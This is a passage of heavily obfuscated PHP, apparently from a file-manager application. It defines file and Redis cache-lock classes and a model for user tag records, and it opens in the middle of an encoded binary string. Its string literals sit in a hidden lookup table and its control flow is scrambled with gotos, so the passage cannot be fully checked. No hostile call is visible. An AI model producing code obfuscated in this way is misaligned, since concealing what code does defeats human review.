²hà›¹eÑÎüHz‰£u&qÂ|$ÛÔÂÂ“ôªtí–(\\åô0â')."\265\335\15\331\72\260\307\166\312\153\271\135\104\20\336\41\260\336\107\121\157\23\43\132\102\270\160\302\54\321\302\14\105\5\20\34\266\44\3\336\22\325\242\162\206\360\22\50\0\361\130\347\224\30\26\317\130"."\x3a\x18\x2b\x31\xe5\xc\xbd\xe2\xb7\x73\x7d\xe1\x4e\x1b\xf6\xd2\xff\x1\x75\xa9\x30\xbc\x52\xc5\x0\x0".""."", 10, -8))); goto dµ·Š¾Ÿ‘; FÅ·÷ŞÜ‹—: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ešÄé¼†¶Ï =& $_SERVER[Æ]; $fñÆğã”µñ = $GLOBALS[$ešÄé¼†¶Ï[6]][$ešÄé¼†¶Ï[337]]; self::$cachePath = $fñÆğã”µñ[$ešÄé¼†¶Ï[167]][$ešÄé¼†¶Ï[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Eğ‡À±Û¼, $CçäŞŒ–Ô§ = 0) { goto fÅ™İâè›‘; fÅ™İâè›‘: $c’×ØÜÃ‚¦ =& $_SERVER[Æ]; $c÷ÇÙöİ‹µ = microtime(!0); $cŞ‘Ğ·Á = $c÷ÇÙöİ‹µ + $CçäŞŒ–Ô§ + 0.0001; goto Då˜Èæ˜Ë§; a…†ç—‡Ñ: $this->unlock($Eğ‡À±Û¼); return !1; goto aİ»ŸŒ×½à; Då˜Èæ˜Ë§: $e£’ç£½ŠÔ = rtrim(self::$cachePath, $c’×ØÜÃ‚¦[8]) . $c’×ØÜÃ‚¦[771] . md5($Eğ‡À±Û¼) . $c’×ØÜÃ‚¦[772]; if (file_exists($e£’ç£½ŠÔ) && filemtime($e£’ç£½ŠÔ) && filemtime($e£’ç£½ŠÔ) < time() - 10) { @unlink($e£’ç£½ŠÔ); } do { if (file_exists($e£’ç£½ŠÔ)) { cacheLockWait(); continue; } $DÔÈôòßÏ› = fopen($e£’ç£½ŠÔ, $c’×ØÜÃ‚¦[773]); if (!$DÔÈôòßÏ›) { return !1; } $F®œ´õ˜±Œ = flock($DÔÈôòßÏ›, LOCK_EX | LOCK_NB); self::$caches[$Eğ‡À±Û¼] = array($c’×ØÜÃ‚¦[774] => $DÔÈôòßÏ›, $c’×ØÜÃ‚¦[167] => $e£’ç£½ŠÔ); fwrite($DÔÈôòßÏ›, $cŞ‘Ğ·Á); clearstatcache(); if ($DÔÈôòßÏ› && $F®œ´õ˜±Œ) { return !0; } cacheLockWait(); } while (microtime(!0) < $cŞ‘Ğ·Á); goto a…†ç—‡Ñ; aİ»ŸŒ×½à: } public function lockGet($f†¾å‰‰À¢) { $Bõòàâ…ˆ‹ =& $_SERVER[Æ]; $dà„¸ÅƒŸÑ = rtrim(self::$cachePath, $Bõòàâ…ˆ‹[8]) . $Bõòàâ…ˆ‹[771] . md5($f†¾å‰‰À¢) . $Bõòàâ…ˆ‹[772]; return file_exists($dà„¸ÅƒŸÑ); } public function unlock($Bíœ‡¿åÁÅ) { goto DùÑ®ù¦Æ; a…Çó›œÒñ: unset(self::$caches[$Bíœ‡¿åÁÅ]); goto AĞã‰¿šæ; e™àõˆ–×‘: @flock($BâŸ¨Õ’§[$B·ëÃÄÂ‚­[774]], LOCK_UN); @fclose($BâŸ¨Õ’§[$B·ëÃÄÂ‚­[774]]); @unlink($BâŸ¨Õ’§[$B·ëÃÄÂ‚­[167]]); goto a…Çó›œÒñ; DùÑ®ù¦Æ: $B·ëÃÄÂ‚­ =& $_SERVER[Æ]; $BâŸ¨Õ’§ = self::$caches[$Bíœ‡¿åÁÅ]; if (!$BâŸ¨Õ’§) { return; } goto e™àõˆ–×‘; AĞã‰¿šæ: } } class CacheLockRedis { public function lock($eŒÉ˜­ÃìÖ, $aç•áœ¥Ç± = 10) { $CÄÎôòŠ² = Cache::init(); $DÄçÂÖº„” = microtime(!0) + $aç•áœ¥Ç±; while (microtime(!0) < $DÄçÂÖº„”) { $C‡¤‡§ˆ¥š = $CÄÎôòŠ²->get($eŒÉ˜­ÃìÖ); if (!$C‡¤‡§ˆ¥š) { $e›©¶˜¿× = $CÄÎôòŠ²->setLock($eŒÉ˜­ÃìÖ, $DÄçÂÖº„”, $aç•áœ¥Ç±); if ($e›©¶˜¿×) { return !0; } } else { if ($C‡¤‡§ˆ¥š < microtime(!0)) { $CÄÎôòŠ²->set($eŒÉ˜­ÃìÖ, $DÄçÂÖº„”, $DÄçÂÖº„”); if ($CÄÎôòŠ²->get($eŒÉ˜­ÃìÖ) === $C‡¤‡§ˆ¥š) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($dìØ’Æšåõ) { return Cache::init()->get($dìØ’Æšåõ); } public function unlock($c´›Å‰Àç) { return Cache::init()->remove($c´›Å‰Àç); } } goto Dù‹¶™¢µÎ; A™ÌèÜŸàŠ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($eğ®´­šµˆ) { $d¥ëÛĞùã =& $_SERVER[Æ]; return array($d¥ëÛĞùã[2486] => array(USER_ID, $d¥ëÛĞùã[2541])); } protected function listData() { $c¬¡Ë­¹¿ô =& $_SERVER[Æ]; $f„ªÀÎÜ… = array($c¬¡Ë­¹¿ô[1425] => USER_ID, $c¬¡Ë­¹¿ô[436] => array($c¬¡Ë­¹¿ô[2542], 0)); $A¼‡”Ÿ¼ˆ = $c¬¡Ë­¹¿ô[2543]; $AÌ¼æËäÅù = $c¬¡Ë­¹¿ô[2544]; $Dñøè…‡¡ = $this->field($A¼‡”Ÿ¼ˆ)->where($f„ªÀÎÜ…)->order($AÌ¼æËäÅù)->select(); return $Dñøè…‡¡ ? $Dñøè…‡¡ : array(); } protected function listByTag($eÒ½‹ìÍº–) { } protected function addToTag($D„ğğÅÛë², $CšèàïÕ‹Ö) { $f¡—‹®¢ô» =& $_SERVER[Æ]; if (!Model($f¡—‹®¢ô»[2311])->listData($CšèàïÕ‹Ö) || !Model($f¡—‹®¢ô»[751])->pathInfo($D„ğğÅÛë²)) { return !1; } $dˆ”Ø™›Ãğ = array($f¡—‹®¢ô»[1425] => USER_ID, $f¡—‹®¢ô»[436] => $CšèàïÕ‹Ö, $f¡—‹®¢ô»[387] => $D„ğğÅÛë², $f¡—‹®¢ô»[388] => $f¡—‹®¢ô»[382], $f¡—‹®¢ô»[386] => $f¡—‹®¢ô»[33], $f¡—‹®¢ô»[2105] => 0); if ($this->where($dˆ”Ø™›Ãğ)->find()) { return !1; } return $this->add($dˆ”Ø™›Ãğ); } protected function removeFromTag($CÕ©¦í¶ö, $EâÎŞ„‰õŒ) { $D‘æô­×‰ì =& $_SERVER[Æ]; if (!Model($D‘æô­×‰ì[2311])->listData($EâÎŞ„‰õŒ)) { return !1; } if (is_array($CÕ©¦í¶ö)) { $CÕ©¦í¶ö = array($D‘æô­×‰ì[7], $CÕ©¦í¶ö); } $DåÏêã¾Œë = array($D‘æô­×‰ì[1425] => USER_ID, $D‘æô­×‰ì[436] => $EâÎŞ„‰õŒ, $D‘æô­×‰ì[388] => $D‘æô­×‰ì[382], $D‘æô­×‰ì[387] => $CÕ©¦í¶ö); return $this->where($DåÏêã¾Œë)->delete(); } protected function removeByTag($aö¤©š¦™ï) { $B®¼¼†’Ë =& $_SERVER[Æ]; if (!$aö¤©š¦™ï) { return !1; } $d¯Ìƒ‘ºïå = array($B®¼¼†’Ë[1425] => USER_ID, $B®¼¼†’Ë[436] => $aö¤©š¦™ï); return $this->where($d¯Ìƒ‘ºïå)->delete(); } protected function removeBySource($eœƒîîä›…) { $cÁÀ¿ó¢Š =& $_SERVER[Æ]; $a‚ãÁñÍÊ = array($cÁÀ¿ó¢Š[1425] => USER_ID, $cÁÀ¿ó¢Š[387] => $eœƒîîä›…, $cÁÀ¿ó¢Š[436] => array($cÁÀ¿ó¢Š[929], 0)); return $this->where($a‚ãÁñÍÊ)->delete(); } }